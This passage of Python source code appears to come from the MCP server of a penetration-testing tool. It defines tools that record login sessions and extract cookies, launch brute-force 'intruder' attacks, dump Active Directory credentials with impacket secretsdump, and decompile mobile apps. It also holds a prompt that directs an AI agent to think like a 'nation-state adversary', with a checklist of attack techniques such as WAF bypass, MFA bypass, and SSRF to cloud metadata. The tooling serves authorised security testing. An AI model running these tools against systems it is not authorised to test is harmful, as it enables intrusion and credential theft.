        except Exception as exc:
            discover_log = {"error": f"{type(exc).__name__}: {exc}"[:200]}

    try:
        mod = LoginMacroModule()
        findings = await mod.run(session, http, config=config or None)
    finally:
        await http.close()

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("authenticated_crawl")

    authenticated = session.credentials.count > 0 and any(
        f.title.startswith("Authenticated Session") for f in findings
    )

    return {
        "authenticated": authenticated,
        "credentials_loaded": session.credentials.count,
        "new_findings": new_count,
        "discovery": discover_log,
        "next_steps": [
            "Authentication established. Run scan_authz to test IDOR with authenticated session.",
            "Run scan_auth for JWT/session testing.",
        ] if authenticated else [
            "Authentication failed. Check credentials or provide login_steps.",
            "Use pentest_configure to add credentials manually.",
        ],
    }


# ─── Ticketing Export ─────────────────────────────────────────────────


@mcp.tool()
async def record_login_macro(
    session_id: str,
    login_url: str | None = None,
    timeout_seconds: int = 60,
) -> dict[str, Any]:
    """Record a login macro interactively using Playwright in headed mode.

    Opens a real Chromium browser window. You perform the login manually.
    After timeout_seconds the recorded steps are captured and stored in
    the session for use by authenticated_crawl.

    Requires a non-headless environment (desktop/display available).

    Returns the recorded macro steps which can be passed back to
    authenticated_crawl(login_steps=...) for replay."""
    from playwright.async_api import async_playwright

    _require_session(session_id)

    target_url = login_url
    if not target_url:
        session = _require_session(session_id)
        target_url = session.target.base_url

    recorded_steps: list[dict] = []
    network_requests: list[dict] = []

    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=False, slow_mo=100)
            context = await browser.new_context(
                ignore_https_errors=True,
                record_video_dir=None,
            )
            page = await context.new_page()

            # Track navigation
            visited_urls: list[str] = []

            async def on_navigated(frame: Any) -> None:
                if frame == page.main_frame:
                    url = frame.url
                    if url not in visited_urls and url.startswith("http"):
                        visited_urls.append(url)

            page.on("framenavigated", on_navigated)

            # Record network requests for API discovery
            async def on_request(req: Any) -> None:
                if req.url.startswith("http"):
                    network_requests.append({
                        "method": req.method,
                        "url": req.url,
                    })

            page.on("request", on_request)

            await page.goto(target_url, wait_until="networkidle", timeout=15000)
            await page.wait_for_timeout(timeout_seconds * 1000)

            # Extract cookies after session
            cookies = await context.cookies()
            local_storage: dict = {}
            try:
                local_storage = await page.evaluate("""() => {
                    const r = {};
                    for (let i=0; i<localStorage.length; i++) {
                        const k = localStorage.key(i);
                        r[k] = localStorage.getItem(k);
                    }
                    return r;
                }""")
            except Exception:
                pass

            # Build macro steps from navigation history
            for url in visited_urls:
                recorded_steps.append({"action": "navigate", "url": url})
                recorded_steps.append({"action": "wait", "ms": 1000})

            await browser.close()

    except Exception as e:
        return {"error": f"Recording failed: {e}"}

    # Inject cookies into session
    session = _require_session(session_id)
    if cookies:
        from pencheff.core.credentials import MaskedSecret
        cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
        cs = session.credentials.get("default")
        if cs:
            cs.cookie = MaskedSecret(cookie_str)
        else:
            session.credentials.add_from_dict("recorded_session", {"cookie": cookie_str})

    # Seed network-intercepted endpoints
    existing = {ep["url"] for ep in session.discovered.endpoints}
    for req in network_requests[:200]:
        if req["url"] not in existing:
            session.discovered.endpoints.append({
                "url": req["url"],
                "method": req["method"],
                "source": "macro_recording",
                "params": [],
            })
            existing.add(req["url"])

    return {
        "recorded_steps": recorded_steps,
        "pages_visited": len(visited_urls),
        "cookies_extracted": len(cookies),
        "network_requests_captured": len(network_requests),
        "endpoints_seeded": len(network_requests),
        "next_steps": [
            "Pass recorded_steps to authenticated_crawl(login_steps=...) for replay.",
            "Session cookies have been injected — subsequent scans are now authenticated.",
            "Run scan_authz to test IDOR with the authenticated session.",
        ],
    }


@mcp.tool()
async def export_to_github(
    session_id: str,
    repo: str,
    severities: list[str] | None = None,
    dry_run: bool = False,
) -> dict[str, Any]:
    """Create GitHub Issues for confirmed findings.

    repo: 'owner/repo' format (e.g. 'myorg/myapp').
    severities: which severities to export (default: critical, high, medium).
    dry_run: preview issues without creating them.

    Requires: gh CLI installed and authenticated (gh auth login).
    Each issue includes severity, endpoint, CVSS score, OWASP mapping, and remediation."""
    session = _require_session(session_id)

    from pencheff.core.ticketing import export_to_github_issues

    return await export_to_github_issues(session, repo, severities, dry_run)


@mcp.tool()
async def export_to_jira(
    session_id: str,
    project_key: str | None = None,
    severities: list[str] | None = None,
    dry_run: bool = False,
) -> dict[str, Any]:
    """Create Jira issues for confirmed findings.

    project_key: Jira project key (e.g. 'SEC'). Falls back to JIRA_PROJECT env var.
    severities: which severities to export (default: critical, high, medium).
    dry_run: preview payloads without creating issues.

    Required env vars: JIRA_URL, JIRA_TOKEN (API token or PAT).
    Optional: JIRA_EMAIL (for basic auth, cloud instances).

    Issues are created as Bugs with priority and security labels matching severity."""
    session = _require_session(session_id)

    from pencheff.core.ticketing import export_to_jira as _export

    return await _export(session, project_key, severities, dry_run)


# ─── First-class template runner ──────────────────────────────────────


@mcp.tool()
async def scan_pulse(
    session_id: str,
    target: str | None = None,
    profile: str | None = None,
    extra_template_paths: list[str] | None = None,
    tags: list[str] | None = None,
    template_ids: list[str] | None = None,
) -> dict[str, Any]:
    """Run Pulse template-based detection against the target as a first-class scan stage.

    Pencheff runs its first-party Pulse templates. Matches are ingested
    into the session's FindingsDB — same dedup,
    severity, and suppression path that every in-house module uses.

    Args:
        session_id: pentest session id
        target: optional override; defaults to the session target
        profile: severity profile (quick|standard|deep|api-only|compliance|cicd).
                 Falls back to the session profile if unset.
        extra_template_paths: additional template roots (consultancies often
            ship custom packs; pin them here).
        tags: filter to templates carrying these Pulse-style tags
              (e.g. ["ssrf", "rce", "cve"]).
        template_ids: explicit template id allowlist
              (e.g. ["CVE-2021-44228", "fortinet-fortigate-ssl-vpn"]).

    Returns:
        Summary of how many findings were ingested, broken down by severity,
        plus a count of unique templates that matched.
    """
    session = _require_session(session_id)
    from pencheff.core.findings import Evidence, Finding
    from pencheff.config import VerificationStatus
    from pencheff.core.pulse import scan as run_pulse

    profile_l = profile or "standard"
    findings = []

    pulse_results = await run_pulse(
        [target or session.target.base_url],
        template_paths=extra_template_paths or None,
        profile=profile_l if profile_l in {"quick", "standard", "deep", "cicd"} else "standard",
        tags=tags or None,
        template_ids=template_ids or None,
    )
    severity_map = {
        "critical": Severity.CRITICAL,
        "high": Severity.HIGH,
        "medium": Severity.MEDIUM,
        "low": Severity.LOW,
        "info": Severity.INFO,
    }
    for result in pulse_results:
        for item in result.findings:
            finding = Finding(
                title=item.name,
                severity=severity_map.get(item.severity, Severity.INFO),
                category="template",
                owasp_category="A05",
                description=item.evidence,
                remediation=item.remediation or "Review and remediate the detected exposure.",
                endpoint=item.url,
                cvss_score=float(item.classification.get("cvss-score", 0.0) or 0.0),
                evidence=[Evidence(
                    request_method="HTTP",
                    request_url=item.url,
                    response_status=item.status_code,
                    description=f"Pulse template `{item.template_id}` matched.",
                )],
                references=(item.references or []) + [f"https://www.cve.org/CVERecord?id={cve}" for cve in item.cves],
                verification_status=VerificationStatus.UNVERIFIED,
            )
            if session.findings.add(finding):
                findings.append(finding)

    by_sev: dict[str, int] = {}
    templates_seen: set[str] = set()
    for f in findings:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        for ev in f.evidence:
            if "template" in (ev.description or ""):
                templates_seen.add(ev.description)

    return {
        "session_id": session_id,
        "target": target or session.target.base_url,
        "profile": profile_l,
        "findings_added": len(findings),
        "severity_breakdown": by_sev,
        "templates_matched": len(templates_seen),
        "note": "First-party Pulse templates were used." if not findings else None,
    }


# ─── Engagement-aware tools (used when running inside the Pencheff backend) ─


@mcp.tool()
async def get_unified_findings(
    engagement_id: str,
    api_base: str | None = None,
    auth_token: str | None = None,
    kinds: list[str] | None = None,
) -> dict[str, Any]:
    """Fetch DAST + SAST + SCA + IaC + secret findings for an engagement.

    Use this to chain across kinds — e.g. a SAST `eval()` hit paired with a
    DAST reflected-XSS finding on the same endpoint, or an SCA CVE that maps
    to a known active exploit.

    Requires the agent to be running inside (or alongside) the Pencheff
    backend so it can hit the unified findings endpoint. Pass api_base +
    auth_token when invoking from outside that environment.
    """
    import os
    import httpx

    base = (api_base or os.environ.get("PENCHEFF_API_BASE", "http://localhost:8000")).rstrip("/")
    headers: dict[str, str] = {}
    token = auth_token or os.environ.get("PENCHEFF_API_TOKEN", "")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            r = await client.get(
                f"{base}/engagements/{engagement_id}/findings/unified",
                headers=headers,
            )
            r.raise_for_status()
            rows = r.json()
    except Exception as exc:
        return {"error": str(exc), "engagement_id": engagement_id}

    if kinds:
        rows = [r for r in rows if r.get("kind") in kinds]

    by_kind: dict[str, int] = {}
    for row in rows:
        by_kind[row.get("kind", "?")] = by_kind.get(row.get("kind", "?"), 0) + 1
    return {
        "engagement_id": engagement_id,
        "count": len(rows),
        "by_kind": by_kind,
        "findings": rows,
    }


@mcp.tool()
async def repeater_send(
    engagement_id: str,
    tab_id: str,
    overrides: dict | None = None,
    api_base: str | None = None,
    auth_token: str | None = None,
) -> dict[str, Any]:
    """Send a saved repeater tab through the Pencheff backend.

    Useful for the agent to re-issue requests with mutated headers/bodies
    while keeping all attempts logged in the engagement's repeater history.
    """
    import os
    import httpx

    base = (api_base or os.environ.get("PENCHEFF_API_BASE", "http://localhost:8000")).rstrip("/")
    headers: dict[str, str] = {}
    token = auth_token or os.environ.get("PENCHEFF_API_TOKEN", "")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            r = await client.post(
                f"{base}/engagements/{engagement_id}/repeater/tabs/{tab_id}/send",
                headers=headers,
                json=overrides or {},
            )
            r.raise_for_status()
            return r.json()
    except Exception as exc:
        return {"error": str(exc), "tab_id": tab_id}


@mcp.tool()
async def intruder_run(
    engagement_id: str,
    name: str,
    request_template: dict,
    payloads: list[str],
    attack_type: str = "sniper",
    concurrency: int = 5,
    rate_limit: int = 20,
    api_base: str | None = None,
    auth_token: str | None = None,
) -> dict[str, Any]:
    """Launch a fresh intruder attack and return the attack id.

    The attack runs asynchronously on the backend Celery worker. Poll the
    attack endpoint to check progress and pull anomalous results.

    request_template: {"method", "url" (with §marker§), "headers", "body"}
    attack_type: sniper | battering-ram | pitchfork | cluster-bomb
    """
    import os
    import httpx

    base = (api_base or os.environ.get("PENCHEFF_API_BASE", "http://localhost:8000")).rstrip("/")
    headers: dict[str, str] = {}
    token = auth_token or os.environ.get("PENCHEFF_API_TOKEN", "")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            ps_resp = await client.post(
                f"{base}/engagements/{engagement_id}/intruder/payload-sets",
                headers=headers,
                json={"name": f"{name}-set", "kind": "wordlist", "entries": payloads},
            )
            ps_resp.raise_for_status()
            payload_set_id = ps_resp.json()["id"]
            r = await client.post(
                f"{base}/engagements/{engagement_id}/intruder/attacks",
                headers=headers,
                json={
                    "name": name,
                    "request_template": request_template,
                    "payload_set_id": payload_set_id,
                    "attack_type": attack_type,
                    "concurrency": concurrency,
                    "rate_limit": rate_limit,
                },
            )
            r.raise_for_status()
            return r.json()
    except Exception as exc:
        return {"error": str(exc)}


# ─── Phase-5: deterministic-workflow MCP tool ──────────────────────────


@mcp.tool()
async def run_workflow(
    name: str,
    target: str | None = None,
    challenge: str | None = None,
    findings_path: str | None = None,
    intensity: str = "default",
) -> dict[str, Any]:
    """Run a deterministic workflow end-to-end. NO model in the loop.

    Available workflow names:
      - "auto_pentest": full deterministic engagement (bug-bounty + CVE intel + red-team narrative)
      - "bug_bounty":   surface enum + scan + triage pipeline
      - "ctf_solve":    CTF auto-solver (challenge can be a path or a text blob)
      - "cve_intel":    enrich findings with linked CVEs
      - "red_team":     MITRE ATT&CK narrative report from findings

    Examples:
      run_workflow(name="auto_pentest", target="https://demo.local")
      run_workflow(name="ctf_solve", challenge="U29tZUNvb2xCYXNlNjRTdHJpbmc=")
      run_workflow(name="cve_intel", findings_path="findings.json")

    Returns the workflow's structured output. Decisions come from the YAML
    policy tables under pencheff/data/policies/ — call ``explain-policy``
    via CLI to see them.
    """
    from pencheff.workflows import get_workflow

    fn = get_workflow(name)
    kwargs: dict[str, Any] = {"intensity": intensity}

    if findings_path:
        import json as _json
        from pathlib import Path as _Path
        kwargs["findings"] = _json.loads(_Path(findings_path).read_text())

    if name in ("auto_pentest", "bug_bounty"):
        if not target:
            return {"error": "workflow requires --target"}
        return await fn(target, **kwargs)
    if name == "ctf_solve":
        if not challenge:
            return {"error": "workflow requires --challenge"}
        return await fn(challenge, **kwargs)
    return await fn(**kwargs)


# ─── MCP Prompts ───────────────────────────────────────────────────────


@mcp.prompt()
def pentest_methodology(target_url: str) -> str:
    """Elite penetration testing methodology — the definitive playbook for comprehensive security assessment."""
    return f"""You are the world's best ethical hacker — a master of offensive security with decades of
combined expertise across web application hacking, network penetration, cloud exploitation, API abuse,
and advanced persistent threat (APT) simulation. You approach {target_url} with the mindset of a
nation-state adversary but the ethics and discipline of a professional.

Your mission: Leave NO vulnerability undiscovered. Think like the most creative attacker on the planet.

═══════════════════════════════════════════════════════════════════
PHASE 1 — PREPARATION & INTELLIGENCE GATHERING
═══════════════════════════════════════════════════════════════════
  1. Call pentest_init with target URL, credentials, and test_depth='deep' for maximum coverage
  2. Call check_dependencies to inventory your arsenal — know your tools before battle

═══════════════════════════════════════════════════════════════════
PHASE 2 — RECONNAISSANCE (The Most Critical Phase)
═══════════════════════════════════════════════════════════════════
  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."

  3. Call recon_passive — DNS enumeration, certificate transparency logs, subdomain discovery,
     WHOIS intelligence, technology fingerprinting. Build a complete picture BEFORE touching the target.
  4. Call recon_active — port scanning, service fingerprinting, web crawling/spidering.
     Map EVERY entry point. Document EVERY technology. Note EVERY anomaly.
  5. Call recon_api_discovery — hunt for OpenAPI/Swagger specs, GraphQL endpoints, hidden APIs,
     debug endpoints, version-specific routes, admin panels.

  THINK: What is the full attack surface? Subdomains? Shadow APIs? Legacy endpoints?
  Third-party integrations? Cloud storage? CDN misconfigs? Exposed admin interfaces?

═══════════════════════════════════════════════════════════════════
PHASE 3 — INFRASTRUCTURE & CONFIGURATION ASSAULT
═══════════════════════════════════════════════════════════════════
  6. Call scan_infrastructure — but don't just check boxes. Analyze:
     - SSL/TLS: weak ciphers, certificate issues, protocol downgrade potential
     - Headers: missing CSP (can we inject?), missing HSTS (can we MITM?), CORS wildcards
     - HTTP methods: PUT/DELETE enabled? TRACE for XST? OPTIONS leaking info?
     - Think about HTTP request smuggling, host header injection, cache poisoning

═══════════════════════════════════════════════════════════════════
PHASE 4 — AUTHENTICATION DESTRUCTION
═══════════════════════════════════════════════════════════════════
  7. Call scan_auth — systematically dismantle auth mechanisms:
     - Session management: predictable tokens? no rotation? missing flags?
     - JWT attacks: none algorithm, key confusion (RS256→HS256), claim tampering, kid injection
     - OAuth/OIDC: redirect_uri manipulation, state parameter absence, token leakage
     - Brute force: account lockout bypass, rate limit circumvention, credential stuffing
     - Password policy: complexity requirements, common password acceptance
     - MFA bypass: backup code abuse, race conditions, channel switching

  8. Call scan_authz with MULTIPLE credential sets — this is where the gold is:
     - IDOR: can user A access user B's resources by changing IDs?
     - Vertical privilege escalation: can a regular user reach admin functions?
     - Horizontal privilege escalation: can users access peer data?
     - RBAC bypass: role manipulation, forced browsing, parameter tampering

═══════════════════════════════════════════════════════════════════
PHASE 4.5 — WAF DETECTION & BYPASS (Run Before Injection!)
═══════════════════════════════════════════════════════════════════
  8.5. Call scan_waf FIRST — intelligence on defenses is critical:
       - Fingerprint WAF vendor (Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity, etc.)
       - Test bypass techniques: encoding, Unicode, case mutation, comment injection
       - Results inform ALL subsequent injection payloads

  8.6. Call payload_generate to create WAF-aware, tech-specific payloads

═══════════════════════════════════════════════════════════════════
PHASE 5 — INJECTION WARFARE (The Art of Code Execution)
═══════════════════════════════════════════════════════════════════
  9. Call scan_injection on ALL discovered endpoints — now includes 10 injection types:
     - SQL injection: error-based, blind boolean, time-based, stacked queries
     - NoSQL injection: MongoDB operator injection, JavaScript injection
     - Command injection: direct, blind (time/DNS-based), argument injection
     - SSTI: Jinja2, Twig, Freemarker, Velocity — each engine has unique RCE paths
     - XXE: file disclosure, SSRF via XXE, blind XXE with OOB exfiltration
     - SSRF: internal service access, cloud metadata (169.254.169.254), port scanning
     - LDAP injection: filter injection, authentication bypass, blind LDAP
     - Second-order injection: stored SQLi/XSS/SSTI via inject-then-trigger
     - Open redirect: redirect parameter injection with bypass techniques
     - Header injection: CRLF injection, response splitting, host header poisoning

  10. Call scan_client_side — browser-side attacks are underestimated:
      - XSS: reflected, stored, DOM-based, mutation XSS, polyglot payloads
      - CSRF: token absence, weak token validation, SameSite bypass, JSON CSRF
      - Clickjacking: frame busting bypass, drag-and-drop attacks

═══════════════════════════════════════════════════════════════════
PHASE 6 — ADVANCED ATTACKS (What Separates Elite from Average)
═══════════════════════════════════════════════════════════════════
  11. Call scan_advanced — the techniques that scanners miss:
      - HTTP request smuggling: CL.TE, TE.CL, TE.TE desync attacks
      - Cache poisoning: unkeyed header injection, cache deception
      - Deserialization: Java, Python pickle, PHP, .NET ViewState, YAML
      - Prototype pollution: server-side JSON, client-side URL parameters
      - DNS rebinding: host header validation, IP binding assessment

═══════════════════════════════════════════════════════════════════
PHASE 7 — API, BUSINESS LOGIC & SPECIALIZED
═══════════════════════════════════════════════════════════════════
  12. Call scan_api — now includes mass assignment testing:
      - GraphQL: introspection dump, query depth attacks, batching abuse
      - REST: mass assignment, BOLA/BFLA, excessive data exposure
      - Fuzzing: unexpected types, boundary values, null bytes

  13. Call scan_business_logic — the vulnerabilities NO scanner can find:
      - Race conditions: double-spend, TOCTOU, parallel account creation
      - Rate limiting: bypass via headers, IP rotation, parameter variation
      - Workflow bypass: skip steps, replay steps, manipulate state transitions

  14. Call scan_cloud if ANY cloud indicators found
  15. Call scan_file_handling if upload endpoints exist

═══════════════════════════════════════════════════════════════════
PHASE 8 — AUTH DEEP DIVE & SPECIALIZED ATTACKS
═══════════════════════════════════════════════════════════════════
  16. Call scan_oauth if OAuth/OIDC endpoints discovered:
      - redirect_uri manipulation and bypass
      - State parameter validation, token leakage, scope escalation

  17. Call scan_mfa_bypass if 2FA is implemented:
      - Direct endpoint access, OTP brute force, backup code abuse
      - Race condition on code validation

  18. Call scan_websocket if WebSocket endpoints discovered:
      - Cross-Site WebSocket Hijacking (CSWSH), auth bypass
      - Message injection (SQLi/XSS/CMDi via WebSocket)

  19. Call scan_subdomain_takeover on all discovered subdomains:
      - Dangling CNAME detection across 20+ services

═══════════════════════════════════════════════════════════════════
PHASE 9 — EXPLOITATION VERIFICATION & CHAINING
═══════════════════════════════════════════════════════════════════
  20. Review findings with get_findings — filter by severity='critical' first
  21. Use test_endpoint to MANUALLY VERIFY every critical and high finding
  22. Call exploit_chain_suggest to AUTOMATICALLY identify attack chains:
      - SSRF → Cloud metadata → AWS keys → Full compromise
      - XSS → Session theft → Admin access → Data exfiltration
      - Open redirect → OAuth token theft → Account takeover
      - HTTP smuggling → Cache poisoning → Mass user compromise
      - Deserialization → Remote Code Execution
      - Mass assignment → Privilege escalation → Admin access
  23. Use test_chain to demonstrate the top exploit chains with PoCs

  THINK LIKE AN ATTACKER: What is the maximum possible impact?

═══════════════════════════════════════════════════════════════════
PHASE 10 — COMPREHENSIVE REPORTING
═══════════════════════════════════════════════════════════════════
  24. Call generate_report with report_type='full' and all compliance frameworks
      - Every finding must have: proof of concept, impact analysis, CVSS score,
        OWASP mapping, remediation guidance, and compliance implications
      - Exploit chains should be documented as narratives showing business impact

═══════════════════════════════════════════════════════════════════
ELITE OPERATOR RULES:
═══════════════════════════════════════════════════════════════════
★ NEVER skip a phase — thoroughness separates amateurs from professionals
★ ALWAYS analyze results deeply before moving on — intelligence drives strategy
★ CHAIN vulnerabilities — a medium + a low can equal a critical
★ TEST edge cases that automated tools miss — null bytes, Unicode, encoding tricks
★ ADAPT your strategy in real-time based on what you discover
★ VERIFY every significant finding manually — false positives destroy credibility
★ THINK CREATIVELY — the best hackers find what others overlook
★ DOCUMENT EVERYTHING — reproducibility is the mark of a professional
★ ASK: "What would I do if I had unlimited time and skill?" — then do that"""


# ─── Evidence Capture + Admin Access (Phase 3 agents) ─────────────────────

# Shared PII-redaction JS injected into the page before screenshot.
# Masks emails, phone-like digit runs, and long digit sequences
# (credit-card / SSN patterns) by replacing them with █ characters.
_REDACT_JS = """
() => {
    const patterns = [
        /\\b[\\w.-]+@[\\w.-]+\\.[A-Za-z]{2,}\\b/g,
        /\\b\\d{3}[-.\\s]?\\d{3,4}[-.\\s]?\\d{4}\\b/g,
        /\\b\\d{13,19}\\b/g,
    ];
    const walker = document.createTreeWalker(
        document.body, NodeFilter.SHOW_TEXT
    );
    let n = 0;
    let node;
    while (node = walker.nextNode()) {
        let text = node.nodeValue;
        patterns.forEach(p => {
            text = text.replace(p, m => {
                n++;
                return '█'.repeat(Math.min(m.length, 20));
            });
        });
        node.nodeValue = text;
    }
    return n;
}
"""


async def _ensure_admin_page(session, target_url: str):
    """Lazily create a Playwright browser page for the AdminAccessAgent.

    Inherits auth cookies stored on the session. The page, browser, and
    Playwright instance are cached on the session object so that
    playwright_navigate / playwright_screenshot / playwright_enumerate_links
    can share a single context.  playwright_logout closes everything.
    """
    if getattr(session, "_admin_page", None) is not None:
        return session._admin_page
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return None
    pw = await async_playwright().start()
    browser = await pw.chromium.launch(headless=True)
    context = await browser.new_context()
    for name, value in (getattr(session, "auth_cookies", []) or []):
        try:
            await context.add_cookies([{"name": name, "value": value, "url": target_url}])
        except Exception:
            pass
    page = await context.new_page()
    session._admin_page = page
    session._admin_browser = browser
    session._admin_pw = pw
    return page


@mcp.tool()
async def capture_evidence(
    session_id: str,
    finding_id: str,
    url: str,
    payload: str | None = None,
    redact_pii: bool = True,
) -> dict[str, Any]:
    """Drive a headless browser to a vulnerable URL (GET only), capture a
    screenshot, redact obvious PII regions (emails, phone numbers, long
    digit runs), and write the result to the scan-evidence directory.

    Used by EvidenceCaptureAgent. Returns {"path": "<relpath>",
    "size_bytes": int, "redacted_regions": int}.
    Only GET requests are performed to avoid any state mutation.
    """
    import os
    from pathlib import Path

    s = _require_session(session_id)
    base = Path(os.path.expanduser("~/.pencheff/evidence")) / session_id
    base.mkdir(parents=True, exist_ok=True)
    out = base / f"{finding_id}.png"

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"error": "playwright not installed"}

    redacted = 0
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            for name, value in (getattr(s, "auth_cookies", []) or []):
                try:
                    await context.add_cookies([{"name": name, "value": value, "url": url}])
                except Exception:
                    pass
            page = await context.new_page()
            # GET-only: append payload as query string if provided.
            if payload:
                sep = "&" if "?" in url else "?"
                full_url = f"{url}{sep}{payload}"
            else:
                full_url = url
            await page.goto(full_url, timeout=15000, wait_until="domcontentloaded")
            if redact_pii:
                try:
                    redacted = await page.evaluate(_REDACT_JS)
                except Exception:
                    redacted = 0
            await page.screenshot(path=str(out), full_page=False, timeout=10000)
            await browser.close()
    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}

    size = out.stat().st_size if out.exists() else 0
    home = Path(os.path.expanduser("~"))
    return {
        "path": str(out.relative_to(home)),
        "size_bytes": size,
        "redacted_regions": redacted,
    }


@mcp.tool()
async def playwright_navigate(
    session_id: str,
    url: str,
) -> dict[str, Any]:
    """GET-only navigation for AdminAccessAgent.

    Drives the session's shared admin browser page to ``url``.  Returns
    status, final URL, and page title.  Auto-aborts with an error dict
    (and triggers implicit logout) if a 5xx or same-host-redirect loop
    is detected — the agent must then call playwright_logout and finish.
    """
    s = _require_session(session_id)
    page = await _ensure_admin_page(s, url)
    if page is None:
        return {"error": "playwright not installed"}
    try:
        resp = await page.goto(url, timeout=15000, wait_until="domcontentloaded")
        status = resp.status if resp else None
        title = await page.title()
        # Auto-abort on 5xx: surface the error so the agent can exit.
        if status is not None and status >= 500:
            return {
                "error": f"server_error_{status}",
                "status": status,
                "final_url": page.url,
                "title": title,
                "auto_abort": True,
            }
        return {"status": status, "final_url": page.url, "title": title}
    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}


@mcp.tool()
async def playwright_screenshot(
    session_id: str,
    finding_id: str,
    redact_pii: bool = True,
) -> dict[str, Any]:
    """Capture a screenshot of the current admin page state.

    Used by AdminAccessAgent.  Applies the same PII-redaction as
    capture_evidence.  Writes to ~/.pencheff/evidence/<session_id>/<finding_id>-admin.png.
    """
    import os
    from pathlib import Path

    s = _require_session(session_id)
    page = getattr(s, "_admin_page", None)
    if page is None:
        return {"error": "no active page; call playwright_navigate first"}
    base = Path(os.path.expanduser("~/.pencheff/evidence")) / session_id
    base.mkdir(parents=True, exist_ok=True)
    out = base / f"{finding_id}-admin.png"
    if redact_pii:
        try:
            await page.evaluate(_REDACT_JS)
        except Exception:
            pass
    try:
        await page.screenshot(path=str(out), full_page=False, timeout=10000)
    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}
    home = Path(os.path.expanduser("~"))
    return {"path": str(out.relative_to(home))}


@mcp.tool()
async def playwright_enumerate_links(
    session_id: str,
    max_links: int = 5,
) -> dict[str, Any]:
    """Enumerate up to max_links visible link texts and hrefs from the current
    admin page.  Read-only — does not click or navigate."""
    s = _require_session(session_id)
    page = getattr(s, "_admin_page", None)
    if page is None:
        return {"error": "no active page; call playwright_navigate first"}
    try:
        links = await page.evaluate(f"""
            () => Array.from(document.querySelectorAll('a, button[role=link]'))
                .slice(0, {int(max_links)})
                .map(el => ({{
                    text: (el.innerText || el.textContent || '').trim().slice(0, 80),
                    href: el.getAttribute('href') || '',
                }}))
                .filter(l => l.text.length > 0)
        """)
        return {"links": links}
    except Exception as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}


@mcp.tool()
async def playwright_logout(
    session_id: str,
) -> dict[str, Any]:
    """Log out of the admin panel and close the browser.

    AdminAccessAgent MUST call this at the end of every run, even if
    earlier steps failed.  Attempts to click a common logout link before
    closing the browser so the server-side session is terminated.
    """
    s = _require_session(session_id)
    page = getattr(s, "_admin_page", None)
    if page is None:
        return {"logged_out": True, "note": "no active page"}
    # Attempt a graceful logout click.
    try:
        for selector in [
            'a[href*="logout"]',
            'button:has-text("Log out")',
            'button:has-text("Sign out")',
            'a:has-text("Logout")',
            'a:has-text("Sign out")',
        ]:
            try:
                if await page.locator(selector).count() > 0:
                    await page.locator(selector).first.click(timeout=3000)
                    break
            except Exception:
                continue
    except Exception:
        pass
    # Always close the browser to ensure no lingering session.
    try:
        browser = getattr(s, "_admin_browser", None)
        pw = getattr(s, "_admin_pw", None)
        if browser is not None:
            await browser.close()
        if pw is not None:
            await pw.stop()
    except Exception:
        pass
    finally:
        s._admin_page = None
        s._admin_browser = None
        s._admin_pw = None
    return {"logged_out": True}


# ── Active Directory / Internal Network ──────────────────────────────────────


@mcp.tool()
async def scan_active_directory(
    session_id: str,
    domain: str,
    username: str,
    password: str,
    dc_ip: str = "",
    modules: list[str] | None = None,
) -> dict[str, Any]:
    """Run Active Directory / internal-network enumeration against the target domain.

    Combines BloodHound relationship collection (certipy ESC chain detection,
    CrackMapExec share/SMB enumeration, and Impacket credential attacks) into
    a single orchestrated pass.

    Requires: bloodhound-python, certipy, crackmapexec, impacket installed.
    Use check_dependencies to verify before running.
    """
    _require_session(session_id)
    from pencheff.modules.ad import bloodhound, certipy, crackmapexec, impacket

    _mods = set(modules or ["bloodhound", "certipy", "crackmapexec", "impacket"])
    results: dict[str, Any] = {}

    if "bloodhound" in _mods:
        results["bloodhound"] = await bloodhound.collect(
            domain=domain, user=username, password=password, dc=dc_ip
        )
    if "certipy" in _mods:
        results["certipy"] = await certipy.find(
            domain=domain, user=username, password=password, dc=dc_ip
        )
    if "crackmapexec" in _mods:
        results["crackmapexec"] = await crackmapexec.smb(
            target=dc_ip or domain, user=username, password=password, domain=domain
        )
    if "impacket" in _mods:
        results["impacket"] = await impacket.secretsdump(
            domain=domain, user=username, password=password, dc=dc_ip or domain
        )

    return {"session_id": session_id, "domain": domain, "results": results}


# ── Mobile Application Security ───────────────────────────────────────────────


@mcp.tool()
async def scan_mobile_app(
    session_id: str,
    apk_path: str,
    platform: str = "android",
    modules: list[str] | None = None,
    mobsf_url: str = "http://127.0.0.1:8000",
) -> dict[str, Any]:
    """Static and dynamic analysis of a mobile application (Android APK or iOS IPA).

    Runs: MobSF REST API (full static scan), apktool decompile + manifest check,
    jadx source extraction, and secrets grep across the decompiled output.

    platform: "android" (APK) or "ios" (IPA).
    Requires: MobSF running locally and MOBSF_API_KEY set in env.
    """
    _require_session(session_id)
    import os
    from pencheff.modules.mobile import mobsf, apktool, manifest, secrets as mobile_secrets

    _mods = set(modules or ["mobsf", "apktool", "manifest", "secrets"])
    results: dict[str, Any] = {"platform": platform, "apk_path": apk_path}

    if "mobsf" in _mods:
        results["mobsf"] = await mobsf.scan(
            apk=apk_path, base_url=mobsf_url,
            api_key=os.environ.get("MOBSF_API_KEY", "")
        )
    if "apktool" in _mods and platform == "android":
        results["apktool"] = await apktool.decompile(apk_path)
    if "manifest" in _mods and platform == "android":
        results["manifest"] = await manifest.check_apk(apk_path)
    if "secrets" in _mods:
        results["secrets"] = await mobile_secrets.scan_apk(apk_path)

    return {"session_id": session_id, "results": results}


# ── Attack Surface Monitoring ─────────────────────────────────────────────────


@mcp.tool()
async def scan_asm(
    session_id: str,
    org: str,
    root_domain: str,
